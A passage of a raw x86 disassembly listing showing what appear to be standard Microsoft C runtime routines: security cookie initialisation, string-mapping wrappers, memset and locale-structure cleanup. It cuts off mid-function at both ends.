  425aad:	call   0x423950
  425ab2:	cmp    DWORD PTR ds:0x466384,0x3
  425ab9:	jne    0x425af5
  425abb:	push   0x4
  425abd:	call   0x423b0f
  425ac2:	pop    ecx
  425ac3:	and    DWORD PTR [ebp-0x4],0x0
  425ac7:	mov    esi,DWORD PTR [ebp+0x8]
  425aca:	push   esi
  425acb:	call   0x424d32
  425ad0:	pop    ecx
  425ad1:	mov    DWORD PTR [ebp-0x1c],eax
  425ad4:	test   eax,eax
  425ad6:	je     0x425ae3
  425ad8:	mov    esi,DWORD PTR [esi-0x4]
  425adb:	sub    esi,0x9
  425ade:	mov    DWORD PTR [ebp-0x20],esi
  425ae1:	jmp    0x425ae6
  425ae3:	mov    esi,DWORD PTR [ebp-0x20]
  425ae6:	or     DWORD PTR [ebp-0x4],0xffffffff
  425aea:	call   0x425b13
  425aef:	cmp    DWORD PTR [ebp-0x1c],0x0
  425af3:	jne    0x425b08
  425af5:	push   DWORD PTR [ebp+0x8]
  425af8:	push   0x0
  425afa:	push   DWORD PTR ds:0x466380
  425b00:	call   DWORD PTR ds:0x428018
  425b06:	mov    esi,eax
  425b08:	mov    eax,esi
  425b0a:	call   0x42398b
  425b0f:	ret    
  425b10:	mov    esi,DWORD PTR [ebp-0x20]
  425b13:	push   0x4
  425b15:	call   0x423a7b
  425b1a:	pop    ecx
  425b1b:	ret    
  425b1c:	push   ebp
  425b1d:	mov    ebp,esp
  425b1f:	sub    esp,0x10
  425b22:	push   esi
  425b23:	lea    eax,[ebp-0x8]
  425b26:	push   eax
  425b27:	call   DWORD PTR ds:0x4280f8
  425b2d:	mov    esi,DWORD PTR [ebp-0x4]
  425b30:	xor    esi,DWORD PTR [ebp-0x8]
  425b33:	call   DWORD PTR ds:0x4280f4
  425b39:	xor    esi,eax
  425b3b:	call   DWORD PTR ds:0x428020
  425b41:	xor    esi,eax
  425b43:	call   DWORD PTR ds:0x4280f0
  425b49:	xor    esi,eax
  425b4b:	lea    eax,[ebp-0x10]
  425b4e:	push   eax
  425b4f:	call   DWORD PTR ds:0x4280ec
  425b55:	mov    eax,DWORD PTR [ebp-0xc]
  425b58:	xor    eax,DWORD PTR [ebp-0x10]
  425b5b:	xor    esi,eax
  425b5d:	mov    DWORD PTR ds:0x465660,esi
  425b63:	jne    0x425b6f
  425b65:	mov    DWORD PTR ds:0x465660,0xbb40e64e
  425b6f:	pop    esi
  425b70:	leave  
  425b71:	ret    
  425b72:	push   0x118
  425b77:	push   0x428978
  425b7c:	call   0x423950
  425b81:	mov    eax,ds:0x465660
  425b86:	xor    eax,DWORD PTR [ebp+0x4]
  425b89:	mov    DWORD PTR [ebp-0x1c],eax
  425b8c:	mov    eax,ds:0x465fd8
  425b91:	xor    ecx,ecx
  425b93:	cmp    eax,ecx
  425b95:	je     0x425bb6
  425b97:	mov    DWORD PTR [ebp-0x4],ecx
  425b9a:	push   DWORD PTR [ebp+0xc]
  425b9d:	push   DWORD PTR [ebp+0x8]
  425ba0:	call   eax
  425ba2:	pop    ecx
  425ba3:	pop    ecx
  425ba4:	or     DWORD PTR [ebp-0x4],0xffffffff
  425ba8:	jmp    0x425cb4
  425bad:	xor    eax,eax
  425baf:	inc    eax
  425bb0:	ret    
  425bb1:	mov    esp,DWORD PTR [ebp-0x18]
  425bb4:	jmp    0x425ba4
  425bb6:	mov    eax,DWORD PTR [ebp+0x8]
  425bb9:	dec    eax
  425bba:	je     0x425bcf
  425bbc:	mov    edi,0x428954
  425bc1:	mov    DWORD PTR [ebp-0x20],0x4288a0
  425bc8:	mov    esi,0xd4
  425bcd:	jmp    0x425be0
  425bcf:	mov    edi,0x428880
  425bd4:	mov    DWORD PTR [ebp-0x20],0x4287e0
  425bdb:	mov    esi,0xb9
  425be0:	mov    BYTE PTR [ebp-0x24],cl
  425be3:	push   0x104
  425be8:	lea    eax,[ebp-0x128]
  425bee:	push   eax
  425bef:	push   ecx
  425bf0:	call   DWORD PTR ds:0x42807c
  425bf6:	test   eax,eax
  425bf8:	jne    0x425c0d
  425bfa:	push   0x4284d4
  425bff:	lea    eax,[ebp-0x128]
  425c05:	push   eax
  425c06:	call   0x423d30
  425c0b:	pop    ecx
  425c0c:	pop    ecx
  425c0d:	lea    ebx,[ebp-0x128]
  425c13:	lea    eax,[ebp-0x128]
  425c19:	push   eax
  425c1a:	call   0x423f60
  425c1f:	pop    ecx
  425c20:	add    eax,0xb
  425c23:	cmp    eax,0x3c
  425c26:	jbe    0x425c51
  425c28:	lea    eax,[ebp-0x128]
  425c2e:	push   eax
  425c2f:	call   0x423f60
  425c34:	mov    ebx,eax
  425c36:	lea    eax,[ebp-0x128]
  425c3c:	sub    eax,0x31
  425c3f:	add    ebx,eax
  425c41:	push   0x3
  425c43:	push   0x4284d0
  425c48:	push   ebx
  425c49:	call   0x423e30
  425c4e:	add    esp,0x10
  425c51:	push   ebx
  425c52:	call   0x423f60
  425c57:	pop    ecx
  425c58:	lea    eax,[eax+esi*1+0xc]
  425c5c:	add    eax,0x3
  425c5f:	and    eax,0xfffffffc
  425c62:	call   0x4239a0
  425c67:	mov    DWORD PTR [ebp-0x18],esp
  425c6a:	mov    esi,esp
  425c6c:	push   edi
  425c6d:	push   esi
  425c6e:	call   0x423d30
  425c73:	mov    edi,0x4284b0
  425c78:	push   edi
  425c79:	push   esi
  425c7a:	call   0x423d40
  425c7f:	push   0x4287d4
  425c84:	push   esi
  425c85:	call   0x423d40
  425c8a:	push   ebx
  425c8b:	push   esi
  425c8c:	call   0x423d40
  425c91:	push   edi
  425c92:	push   esi
  425c93:	call   0x423d40
  425c98:	push   DWORD PTR [ebp-0x20]
  425c9b:	push   esi
  425c9c:	call   0x423d40
  425ca1:	push   0x12010
  425ca6:	push   0x428488
  425cab:	push   esi
  425cac:	call   0x423c32
  425cb1:	add    esp,0x3c
  425cb4:	push   0x3
  425cb6:	call   0x422dbc
  425cbb:	int3   
  425cbc:	push   0x38
  425cbe:	push   0x428d98
  425cc3:	call   0x423950
  425cc8:	xor    ebx,ebx
  425cca:	cmp    DWORD PTR ds:0x465ffc,ebx
  425cd0:	jne    0x425d0a
  425cd2:	push   ebx
  425cd3:	push   ebx
  425cd4:	xor    esi,esi
  425cd6:	inc    esi
  425cd7:	push   esi
  425cd8:	push   0x428d94
  425cdd:	push   0x100
  425ce2:	push   ebx
  425ce3:	call   DWORD PTR ds:0x428104
  425ce9:	test   eax,eax
  425ceb:	je     0x425cf5
  425ced:	mov    DWORD PTR ds:0x465ffc,esi
  425cf3:	jmp    0x425d0a
  425cf5:	call   DWORD PTR ds:0x42803c
  425cfb:	cmp    eax,0x78
  425cfe:	jne    0x425d0a
  425d00:	mov    DWORD PTR ds:0x465ffc,0x2
  425d0a:	cmp    DWORD PTR [ebp+0x14],ebx
  425d0d:	jle    0x425d2a
  425d0f:	mov    ecx,DWORD PTR [ebp+0x14]
  425d12:	mov    eax,DWORD PTR [ebp+0x10]
  425d15:	dec    ecx
  425d16:	cmp    BYTE PTR [eax],bl
  425d18:	je     0x425d22
  425d1a:	inc    eax
  425d1b:	cmp    ecx,ebx
  425d1d:	jne    0x425d15
  425d1f:	or     ecx,0xffffffff
  425d22:	or     eax,0xffffffff
  425d25:	sub    eax,ecx
  425d27:	add    DWORD PTR [ebp+0x14],eax
  425d2a:	mov    eax,ds:0x465ffc
  425d2f:	cmp    eax,0x2
  425d32:	je     0x425f14
  425d38:	cmp    eax,ebx
  425d3a:	je     0x425f14
  425d40:	cmp    eax,0x1
  425d43:	jne    0x425f47
  425d49:	xor    edi,edi
  425d4b:	mov    DWORD PTR [ebp-0x1c],edi
  425d4e:	mov    DWORD PTR [ebp-0x20],ebx
  425d51:	mov    DWORD PTR [ebp-0x24],ebx
  425d54:	cmp    DWORD PTR [ebp+0x20],ebx
  425d57:	jne    0x425d61
  425d59:	mov    eax,ds:0x465ff4
  425d5e:	mov    DWORD PTR [ebp+0x20],eax
  425d61:	push   ebx
  425d62:	push   ebx
  425d63:	push   DWORD PTR [ebp+0x14]
  425d66:	push   DWORD PTR [ebp+0x10]
  425d69:	xor    eax,eax
  425d6b:	cmp    DWORD PTR [ebp+0x24],ebx
  425d6e:	setne  al
  425d71:	lea    eax,[eax*8+0x1]
  425d78:	push   eax
  425d79:	push   DWORD PTR [ebp+0x20]
  425d7c:	call   DWORD PTR ds:0x428100
  425d82:	mov    esi,eax
  425d84:	mov    DWORD PTR [ebp-0x28],esi
  425d87:	cmp    esi,ebx
  425d89:	je     0x425f47
  425d8f:	mov    DWORD PTR [ebp-0x4],0x1
  425d96:	lea    eax,[esi+esi*1]
  425d99:	add    eax,0x3
  425d9c:	and    eax,0xfffffffc
  425d9f:	call   0x4239a0
  425da4:	mov    DWORD PTR [ebp-0x18],esp
  425da7:	mov    eax,esp
  425da9:	mov    DWORD PTR [ebp-0x2c],eax
  425dac:	or     DWORD PTR [ebp-0x4],0xffffffff
  425db0:	jmp    0x425dcd
  425db2:	xor    eax,eax
  425db4:	inc    eax
  425db5:	ret    
  425db6:	mov    esp,DWORD PTR [ebp-0x18]
  425db9:	call   0x426de5
  425dbe:	xor    ebx,ebx
  425dc0:	mov    DWORD PTR [ebp-0x2c],ebx
  425dc3:	or     DWORD PTR [ebp-0x4],0xffffffff
  425dc7:	mov    edi,DWORD PTR [ebp-0x1c]
  425dca:	mov    esi,DWORD PTR [ebp-0x28]
  425dcd:	cmp    DWORD PTR [ebp-0x2c],ebx
  425dd0:	jne    0x425dee
  425dd2:	lea    eax,[esi+esi*1]
  425dd5:	push   eax
  425dd6:	call   0x424672
  425ddb:	pop    ecx
  425ddc:	mov    DWORD PTR [ebp-0x2c],eax
  425ddf:	cmp    eax,ebx
  425de1:	je     0x425f47
  425de7:	mov    DWORD PTR [ebp-0x20],0x1
  425dee:	push   esi
  425def:	push   DWORD PTR [ebp-0x2c]
  425df2:	push   DWORD PTR [ebp+0x14]
  425df5:	push   DWORD PTR [ebp+0x10]
  425df8:	push   0x1
  425dfa:	push   DWORD PTR [ebp+0x20]
  425dfd:	call   DWORD PTR ds:0x428100
  425e03:	test   eax,eax
  425e05:	je     0x425ef1
  425e0b:	push   ebx
  425e0c:	push   ebx
  425e0d:	push   esi
  425e0e:	push   DWORD PTR [ebp-0x2c]
  425e11:	push   DWORD PTR [ebp+0xc]
  425e14:	push   DWORD PTR [ebp+0x8]
  425e17:	call   DWORD PTR ds:0x428104
  425e1d:	mov    edi,eax
  425e1f:	mov    DWORD PTR [ebp-0x1c],edi
  425e22:	cmp    edi,ebx
  425e24:	je     0x425ef1
  425e2a:	test   BYTE PTR [ebp+0xd],0x4
  425e2e:	je     0x425e5d
  425e30:	cmp    DWORD PTR [ebp+0x1c],ebx
  425e33:	je     0x425ef1
  425e39:	cmp    edi,DWORD PTR [ebp+0x1c]
  425e3c:	jg     0x425ef1
  425e42:	push   DWORD PTR [ebp+0x1c]
  425e45:	push   DWORD PTR [ebp+0x18]
  425e48:	push   esi
  425e49:	push   DWORD PTR [ebp-0x2c]
  425e4c:	push   DWORD PTR [ebp+0xc]
  425e4f:	push   DWORD PTR [ebp+0x8]
  425e52:	call   DWORD PTR ds:0x428104
  425e58:	jmp    0x425ef1
  425e5d:	mov    DWORD PTR [ebp-0x4],0x2
  425e64:	lea    eax,[edi+edi*1]
  425e67:	add    eax,0x3
  425e6a:	and    eax,0xfffffffc
  425e6d:	call   0x4239a0
  425e72:	mov    DWORD PTR [ebp-0x18],esp
  425e75:	mov    eax,esp
  425e77:	mov    DWORD PTR [ebp-0x30],eax
  425e7a:	or     DWORD PTR [ebp-0x4],0xffffffff
  425e7e:	jmp    0x425e9b
  425e80:	xor    eax,eax
  425e82:	inc    eax
  425e83:	ret    
  425e84:	mov    esp,DWORD PTR [ebp-0x18]
  425e87:	call   0x426de5
  425e8c:	xor    ebx,ebx
  425e8e:	mov    DWORD PTR [ebp-0x30],ebx
  425e91:	or     DWORD PTR [ebp-0x4],0xffffffff
  425e95:	mov    edi,DWORD PTR [ebp-0x1c]
  425e98:	mov    esi,DWORD PTR [ebp-0x28]
  425e9b:	cmp    DWORD PTR [ebp-0x30],ebx
  425e9e:	jne    0x425eb8
  425ea0:	lea    eax,[edi+edi*1]
  425ea3:	push   eax
  425ea4:	call   0x424672
  425ea9:	pop    ecx
  425eaa:	mov    DWORD PTR [ebp-0x30],eax
  425ead:	cmp    eax,ebx
  425eaf:	je     0x425ef1
  425eb1:	mov    DWORD PTR [ebp-0x24],0x1
  425eb8:	push   edi
  425eb9:	push   DWORD PTR [ebp-0x30]
  425ebc:	push   esi
  425ebd:	push   DWORD PTR [ebp-0x2c]
  425ec0:	push   DWORD PTR [ebp+0xc]
  425ec3:	push   DWORD PTR [ebp+0x8]
  425ec6:	call   DWORD PTR ds:0x428104
  425ecc:	test   eax,eax
  425ece:	je     0x425ef1
  425ed0:	push   ebx
  425ed1:	push   ebx
  425ed2:	cmp    DWORD PTR [ebp+0x1c],ebx
  425ed5:	jne    0x425edb
  425ed7:	push   ebx
  425ed8:	push   ebx
  425ed9:	jmp    0x425ee1
  425edb:	push   DWORD PTR [ebp+0x1c]
  425ede:	push   DWORD PTR [ebp+0x18]
  425ee1:	push   edi
  425ee2:	push   DWORD PTR [ebp-0x30]
  425ee5:	push   ebx
  425ee6:	push   DWORD PTR [ebp+0x20]
  425ee9:	call   DWORD PTR ds:0x428090
  425eef:	mov    edi,eax
  425ef1:	cmp    DWORD PTR [ebp-0x24],ebx
  425ef4:	je     0x425eff
  425ef6:	push   DWORD PTR [ebp-0x30]
  425ef9:	call   0x42455a
  425efe:	pop    ecx
  425eff:	cmp    DWORD PTR [ebp-0x20],ebx
  425f02:	je     0x425f0d
  425f04:	push   DWORD PTR [ebp-0x2c]
  425f07:	call   0x42455a
  425f0c:	pop    ecx
  425f0d:	mov    eax,edi
  425f0f:	jmp    0x42606f
  425f14:	mov    DWORD PTR [ebp-0x34],ebx
  425f17:	xor    edi,edi
  425f19:	mov    DWORD PTR [ebp-0x38],ebx
  425f1c:	cmp    DWORD PTR [ebp+0x8],ebx
  425f1f:	jne    0x425f29
  425f21:	mov    eax,ds:0x465fe4
  425f26:	mov    DWORD PTR [ebp+0x8],eax
  425f29:	cmp    DWORD PTR [ebp+0x20],ebx
  425f2c:	jne    0x425f36
  425f2e:	mov    eax,ds:0x465ff4
  425f33:	mov    DWORD PTR [ebp+0x20],eax
  425f36:	push   DWORD PTR [ebp+0x8]
  425f39:	call   0x426bcd
  425f3e:	pop    ecx
  425f3f:	mov    DWORD PTR [ebp-0x3c],eax
  425f42:	cmp    eax,0xffffffff
  425f45:	jne    0x425f4e
  425f47:	xor    eax,eax
  425f49:	jmp    0x42606f
  425f4e:	cmp    eax,DWORD PTR [ebp+0x20]
  425f51:	je     0x426045
  425f57:	push   ebx
  425f58:	push   ebx
  425f59:	lea    ecx,[ebp+0x14]
  425f5c:	push   ecx
  425f5d:	push   DWORD PTR [ebp+0x10]
  425f60:	push   eax
  425f61:	push   DWORD PTR [ebp+0x20]
  425f64:	call   0x426c16
  425f69:	add    esp,0x18
  425f6c:	mov    DWORD PTR [ebp-0x34],eax
  425f6f:	cmp    eax,ebx
  425f71:	je     0x425f47
  425f73:	push   ebx
  425f74:	push   ebx
  425f75:	push   DWORD PTR [ebp+0x14]
  425f78:	push   eax
  425f79:	push   DWORD PTR [ebp+0xc]
  425f7c:	push   DWORD PTR [ebp+0x8]
  425f7f:	call   DWORD PTR ds:0x4280fc
  425f85:	mov    esi,eax
  425f87:	mov    DWORD PTR [ebp-0x40],esi
  425f8a:	cmp    esi,ebx
  425f8c:	je     0x426034
  425f92:	mov    DWORD PTR [ebp-0x4],ebx
  425f95:	add    eax,0x3
  425f98:	and    eax,0xfffffffc
  425f9b:	call   0x4239a0
  425fa0:	mov    DWORD PTR [ebp-0x18],esp
  425fa3:	mov    edi,esp
  425fa5:	mov    DWORD PTR [ebp-0x44],edi
  425fa8:	push   esi
  425fa9:	push   ebx
  425faa:	push   edi
  425fab:	call   0x426250
  425fb0:	add    esp,0xc
  425fb3:	jmp    0x425fc5
  425fb5:	xor    eax,eax
  425fb7:	inc    eax
  425fb8:	ret    
  425fb9:	mov    esp,DWORD PTR [ebp-0x18]
  425fbc:	call   0x426de5
  425fc1:	xor    ebx,ebx
  425fc3:	xor    edi,edi
  425fc5:	or     DWORD PTR [ebp-0x4],0xffffffff
  425fc9:	cmp    edi,ebx
  425fcb:	jne    0x425ff0
  425fcd:	push   DWORD PTR [ebp-0x40]
  425fd0:	call   0x424672
  425fd5:	pop    ecx
  425fd6:	mov    edi,eax
  425fd8:	cmp    edi,ebx
  425fda:	je     0x42600d
  425fdc:	push   DWORD PTR [ebp-0x40]
  425fdf:	push   ebx
  425fe0:	push   edi
  425fe1:	call   0x426250
  425fe6:	add    esp,0xc
  425fe9:	mov    DWORD PTR [ebp-0x38],0x1
  425ff0:	push   DWORD PTR [ebp-0x40]
  425ff3:	push   edi
  425ff4:	push   DWORD PTR [ebp+0x14]
  425ff7:	push   DWORD PTR [ebp-0x34]
  425ffa:	push   DWORD PTR [ebp+0xc]
  425ffd:	push   DWORD PTR [ebp+0x8]
  426000:	call   DWORD PTR ds:0x4280fc
  426006:	mov    DWORD PTR [ebp-0x40],eax
  426009:	cmp    eax,ebx
  42600b:	jne    0x426011
  42600d:	xor    esi,esi
  42600f:	jmp    0x426037
  426011:	push   DWORD PTR [ebp+0x1c]
  426014:	push   DWORD PTR [ebp+0x18]
  426017:	lea    eax,[ebp-0x40]
  42601a:	push   eax
  42601b:	push   edi
  42601c:	push   DWORD PTR [ebp+0x20]
  42601f:	push   DWORD PTR [ebp-0x3c]
  426022:	call   0x426c16
  426027:	add    esp,0x18
  42602a:	mov    esi,eax
  42602c:	neg    esi
  42602e:	sbb    esi,esi
  426030:	neg    esi
  426032:	jmp    0x426037
  426034:	mov    esi,DWORD PTR [ebp-0x48]
  426037:	cmp    DWORD PTR [ebp-0x38],ebx
  42603a:	je     0x42605f
  42603c:	push   edi
  42603d:	call   0x42455a
  426042:	pop    ecx
  426043:	jmp    0x42605f
  426045:	push   DWORD PTR [ebp+0x1c]
  426048:	push   DWORD PTR [ebp+0x18]
  42604b:	push   DWORD PTR [ebp+0x14]
  42604e:	push   DWORD PTR [ebp+0x10]
  426051:	push   DWORD PTR [ebp+0xc]
  426054:	push   DWORD PTR [ebp+0x8]
  426057:	call   DWORD PTR ds:0x4280fc
  42605d:	mov    esi,eax
  42605f:	cmp    DWORD PTR [ebp-0x34],ebx
  426062:	je     0x42606d
  426064:	push   DWORD PTR [ebp-0x34]
  426067:	call   0x42455a
  42606c:	pop    ecx
  42606d:	mov    eax,esi
  42606f:	lea    esp,[ebp-0x54]
  426072:	call   0x42398b
  426077:	ret    
  426078:	push   0x1c
  42607a:	push   0x428dc0
  42607f:	call   0x423950
  426084:	xor    esi,esi
  426086:	cmp    DWORD PTR ds:0x466000,esi
  42608c:	jne    0x4260c3
  42608e:	lea    eax,[ebp-0x1c]
  426091:	push   eax
  426092:	xor    edi,edi
  426094:	inc    edi
  426095:	push   edi
  426096:	push   0x428d94
  42609b:	push   edi
  42609c:	call   DWORD PTR ds:0x42810c
  4260a2:	test   eax,eax
  4260a4:	je     0x4260ae
  4260a6:	mov    DWORD PTR ds:0x466000,edi
  4260ac:	jmp    0x4260c3
  4260ae:	call   DWORD PTR ds:0x42803c
  4260b4:	cmp    eax,0x78
  4260b7:	jne    0x4260c3
  4260b9:	mov    DWORD PTR ds:0x466000,0x2
  4260c3:	mov    eax,ds:0x466000
  4260c8:	cmp    eax,0x2
  4260cb:	je     0x4261bb
  4260d1:	cmp    eax,esi
  4260d3:	je     0x4261bb
  4260d9:	cmp    eax,0x1
  4260dc:	jne    0x4261e1
  4260e2:	mov    DWORD PTR [ebp-0x20],esi
  4260e5:	mov    DWORD PTR [ebp-0x24],esi
  4260e8:	cmp    DWORD PTR [ebp+0x18],esi
  4260eb:	jne    0x4260f5
  4260ed:	mov    eax,ds:0x465ff4
  4260f2:	mov    DWORD PTR [ebp+0x18],eax
  4260f5:	push   esi
  4260f6:	push   esi
  4260f7:	push   DWORD PTR [ebp+0x10]
  4260fa:	push   DWORD PTR [ebp+0xc]
  4260fd:	xor    eax,eax
  4260ff:	cmp    DWORD PTR [ebp+0x20],esi
  426102:	setne  al
  426105:	lea    eax,[eax*8+0x1]
  42610c:	push   eax
  42610d:	push   DWORD PTR [ebp+0x18]
  426110:	call   DWORD PTR ds:0x428100
  426116:	mov    edi,eax
  426118:	mov    DWORD PTR [ebp-0x28],edi
  42611b:	test   edi,edi
  42611d:	je     0x4261e1
  426123:	and    DWORD PTR [ebp-0x4],0x0
  426127:	lea    ebx,[edi+edi*1]
  42612a:	mov    eax,ebx
  42612c:	add    eax,0x3
  42612f:	and    eax,0xfffffffc
  426132:	call   0x4239a0
  426137:	mov    DWORD PTR [ebp-0x18],esp
  42613a:	mov    esi,esp
  42613c:	mov    DWORD PTR [ebp-0x2c],esi
  42613f:	push   ebx
  426140:	push   0x0
  426142:	push   esi
  426143:	call   0x426250
  426148:	add    esp,0xc
  42614b:	or     DWORD PTR [ebp-0x4],0xffffffff
  42614f:	jmp    0x426166
  426151:	xor    eax,eax
  426153:	inc    eax
  426154:	ret    
  426155:	mov    esp,DWORD PTR [ebp-0x18]
  426158:	call   0x426de5
  42615d:	xor    esi,esi
  42615f:	or     DWORD PTR [ebp-0x4],0xffffffff
  426163:	mov    edi,DWORD PTR [ebp-0x28]
  426166:	test   esi,esi
  426168:	jne    0x426181
  42616a:	push   edi
  42616b:	push   0x2
  42616d:	call   0x424a68
  426172:	pop    ecx
  426173:	pop    ecx
  426174:	mov    esi,eax
  426176:	test   esi,esi
  426178:	je     0x4261e1
  42617a:	mov    DWORD PTR [ebp-0x24],0x1
  426181:	push   edi
  426182:	push   esi
  426183:	push   DWORD PTR [ebp+0x10]
  426186:	push   DWORD PTR [ebp+0xc]
  426189:	push   0x1
  42618b:	push   DWORD PTR [ebp+0x18]
  42618e:	call   DWORD PTR ds:0x428100
  426194:	test   eax,eax
  426196:	je     0x4261a9
  426198:	push   DWORD PTR [ebp+0x14]
  42619b:	push   eax
  42619c:	push   esi
  42619d:	push   DWORD PTR [ebp+0x8]
  4261a0:	call   DWORD PTR ds:0x42810c
  4261a6:	mov    DWORD PTR [ebp-0x20],eax
  4261a9:	cmp    DWORD PTR [ebp-0x24],0x0
  4261ad:	je     0x4261b6
  4261af:	push   esi
  4261b0:	call   0x42455a
  4261b5:	pop    ecx
  4261b6:	mov    eax,DWORD PTR [ebp-0x20]
  4261b9:	jmp    0x426229
  4261bb:	mov    ebx,DWORD PTR [ebp+0x1c]
  4261be:	cmp    ebx,esi
  4261c0:	jne    0x4261c8
  4261c2:	mov    ebx,DWORD PTR ds:0x465fe4
  4261c8:	mov    edi,DWORD PTR [ebp+0x18]
  4261cb:	test   edi,edi
  4261cd:	jne    0x4261d5
  4261cf:	mov    edi,DWORD PTR ds:0x465ff4
  4261d5:	push   ebx
  4261d6:	call   0x426bcd
  4261db:	pop    ecx
  4261dc:	cmp    eax,0xffffffff
  4261df:	jne    0x4261e5
  4261e1:	xor    eax,eax
  4261e3:	jmp    0x426229
  4261e5:	cmp    eax,edi
  4261e7:	je     0x426207
  4261e9:	push   0x0
  4261eb:	push   0x0
  4261ed:	lea    ecx,[ebp+0x10]
  4261f0:	push   ecx
  4261f1:	push   DWORD PTR [ebp+0xc]
  4261f4:	push   eax
  4261f5:	push   edi
  4261f6:	call   0x426c16
  4261fb:	add    esp,0x18
  4261fe:	mov    esi,eax
  426200:	test   esi,esi
  426202:	je     0x4261e1
  426204:	mov    DWORD PTR [ebp+0xc],esi
  426207:	push   DWORD PTR [ebp+0x14]
  42620a:	push   DWORD PTR [ebp+0x10]
  42620d:	push   DWORD PTR [ebp+0xc]
  426210:	push   DWORD PTR [ebp+0x8]
  426213:	push   ebx
  426214:	call   DWORD PTR ds:0x428108
  42621a:	mov    edi,eax
  42621c:	test   esi,esi
  42621e:	je     0x426227
  426220:	push   esi
  426221:	call   0x42455a
  426226:	pop    ecx
  426227:	mov    eax,edi
  426229:	lea    esp,[ebp-0x38]
  42622c:	call   0x42398b
  426231:	ret    
  426232:	mov    eax,ds:0x466004
  426237:	test   eax,eax
  426239:	je     0x42624a
  42623b:	push   DWORD PTR [esp+0x4]
  42623f:	call   eax
  426241:	test   eax,eax
  426243:	pop    ecx
  426244:	je     0x42624a
  426246:	xor    eax,eax
  426248:	inc    eax
  426249:	ret    
  42624a:	xor    eax,eax
  42624c:	ret    
  42624d:	int3   
  42624e:	int3   
  42624f:	int3   
  426250:	mov    edx,DWORD PTR [esp+0xc]
  426254:	mov    ecx,DWORD PTR [esp+0x4]
  426258:	test   edx,edx
  42625a:	je     0x4262ab
  42625c:	xor    eax,eax
  42625e:	mov    al,BYTE PTR [esp+0x8]
  426262:	push   edi
  426263:	mov    edi,ecx
  426265:	cmp    edx,0x4
  426268:	jb     0x42629b
  42626a:	neg    ecx
  42626c:	and    ecx,0x3
  42626f:	je     0x42627d
  426271:	sub    edx,ecx
  426273:	mov    BYTE PTR [edi],al
  426275:	add    edi,0x1
  426278:	sub    ecx,0x1
  42627b:	jne    0x426273
  42627d:	mov    ecx,eax
  42627f:	shl    eax,0x8
  426282:	add    eax,ecx
  426284:	mov    ecx,eax
  426286:	shl    eax,0x10
  426289:	add    eax,ecx
  42628b:	mov    ecx,edx
  42628d:	and    edx,0x3
  426290:	shr    ecx,0x2
  426293:	je     0x42629b
  426295:	rep stos DWORD PTR es:[edi],eax
  426297:	test   edx,edx
  426299:	je     0x4262a5
  42629b:	mov    BYTE PTR [edi],al
  42629d:	add    edi,0x1
  4262a0:	sub    edx,0x1
  4262a3:	jne    0x42629b
  4262a5:	mov    eax,DWORD PTR [esp+0x8]
  4262a9:	pop    edi
  4262aa:	ret    
  4262ab:	mov    eax,DWORD PTR [esp+0x4]
  4262af:	ret    
  4262b0:	push   esi
  4262b1:	mov    esi,DWORD PTR [esp+0x8]
  4262b5:	test   esi,esi
  4262b7:	je     0x42643e
  4262bd:	push   DWORD PTR [esi+0x4]
  4262c0:	call   0x42455a
  4262c5:	push   DWORD PTR [esi+0x8]
  4262c8:	call   0x42455a
  4262cd:	push   DWORD PTR [esi+0xc]
  4262d0:	call   0x42455a
  4262d5:	push   DWORD PTR [esi+0x10]
  4262d8:	call   0x42455a
  4262dd:	push   DWORD PTR [esi+0x14]
  4262e0:	call   0x42455a
  4262e5:	push   DWORD PTR [esi+0x18]
  4262e8:	call   0x42455a
  4262ed:	push   DWORD PTR [esi]
  4262ef:	call   0x42455a
  4262f4:	push   DWORD PTR [esi+0x20]
  4262f7:	call   0x42455a
  4262fc:	push   DWORD PTR [esi+0x24]
  4262ff:	call   0x42455a
  426304:	push   DWORD PTR [esi+0x28]
  426307:	call   0x42455a
  42630c:	push   DWORD PTR [esi+0x2c]
  42630f:	call   0x42455a
  426314:	push   DWORD PTR [esi+0x30]
  426317:	call   0x42455a
  42631c:	push   DWORD PTR [esi+0x34]
  42631f:	call   0x42455a
  426324:	push   DWORD PTR [esi+0x1c]
  426327:	call   0x42455a
  42632c:	push   DWORD PTR [esi+0x38]
  42632f:	call   0x42455a
  426334:	push   DWORD PTR [esi+0x3c]
  426337:	call   0x42455a
  42633c:	add    esp,0x40
  42633f:	push   DWORD PTR [esi+0x40]
  426342:	call   0x42455a
  426347:	push   DWORD PTR [esi+0x44]
  42634a:	call   0x42455a
  42634f:	push   DWORD PTR [esi+0x48]
  426352:	call   0x42455a
  426357:	push   DWORD PTR [esi+0x4c]
  42635a:	call   0x42455a
  42635f:	push   DWORD PTR [esi+0x50]
  426362:	call   0x42455a
  426367:	push   DWORD PTR [esi+0x54]
  42636a:	call   0x42455a
  42636f:	push   DWORD PTR [esi+0x58]
  426372:	call   0x42455a
  426377:	push   DWORD PTR [esi+0x5c]
  42637a:	call   0x42455a
  42637f:	push   DWORD PTR [esi+0x60]
  426382:	call   0x42455a
  426387:	push   DWORD PTR [esi+0x64]
  42638a:	call   0x42455a
  42638f:	push   DWORD PTR [esi+0x68]
  426392:	call   0x42455a
  426397:	push   DWORD PTR [esi+0x6c]
  42639a:	call   0x42455a
  42639f:	push   DWORD PTR [esi+0x70]
  4263a2:	call   0x42455a
  4263a7:	push   DWORD PTR [esi+0x74]
  4263aa:	call   0x42455a
  4263af:	push   DWORD PTR [esi+0x78]
  4263b2:	call   0x42455a
  4263b7:	push   DWORD PTR [esi+0x7c]
  4263ba:	call   0x42455a
  4263bf:	add    esp,0x40
  4263c2:	push   DWORD PTR [esi+0x80]
  4263c8:	call   0x42455a
  4263cd:	push   DWORD PTR [esi+0x84]
  4263d3:	call   0x42455a
  4263d8:	push   DWORD PTR [esi+0x88]
  4263de:	call   0x42455a
  4263e3:	push   DWORD PTR [esi+0x8c]
  4263e9:	call   0x42455a
  4263ee:	push   DWORD PTR [esi+0x90]
  4263f4:	call   0x42455a
  4263f9:	push   DWORD PTR [esi+0x94]
  4263ff:	call   0x42455a
  426404:	push   DWORD PTR [esi+0x98]
  42640a:	call   0x42455a
  42640f:	push   DWORD PTR [esi+0x9c]
  426415:	call   0x42455a
  42641a:	push   DWORD PTR [esi+0xa0]
  426420:	call   0x42455a
  426425:	push   DWORD PTR [esi+0xa4]
  42642b:	call   0x42455a
  426430:	push   DWORD PTR [esi+0xa8]
  426436:	call   0x42455a
  42643b:	add    esp,0x2c
  42643e:	pop    esi
  42643f:	ret    
  426440:	push   esi
  426441:	mov    esi,DWORD PTR [esp+0x8]
  426445:	test   esi,esi
  426447:	je     0x42649d
  426449:	mov    eax,DWORD PTR [esi]
  42644b:	mov    ecx,DWORD PTR ds:0x465b64
